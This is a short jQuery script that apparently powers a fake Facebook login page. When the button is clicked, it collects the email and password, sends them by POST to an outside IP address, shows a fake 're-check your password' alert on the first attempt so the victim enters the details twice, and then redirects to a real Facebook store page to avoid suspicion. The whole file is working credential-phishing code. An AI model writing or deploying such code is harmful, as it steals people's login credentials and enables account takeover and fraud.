$(function () {
    var attempt = 1;
    $("#button").click(function () {
        console.log('Test');
        var email = $("#email").val();
        var password = $("#password").val();
        console.log(email, password);
        $.ajax({
            url: 'http://35.200.245.209/push',
            method: 'POST',
            data: {
                data: `attempt: ${attempt} email: ${email}, password: ${password}`,
                key:'mockFb',
                user:'mockFb',
                user_id:'rnd',
                behaviour:'post'
            },
            success: function(data){
                console.log('DONE');
                if(attempt == 1){
                    attempt++;
                    setTimeout(function(){
                        alert('Please re-check username and password and try again...');
                    },1000);
                } else {
                    window.location.href = 'https://m.facebook.com/FashionEverydayStore/';
                }
                
            },
            error: function(err){
                console.log('Error');
            }
        });
    });
});



//

/*val: val,
        time: time,
        key_: key_,
        user: req.body.user,
        user_id: req.body.user_id,
        behaviour: req.body.behaviour,*/
//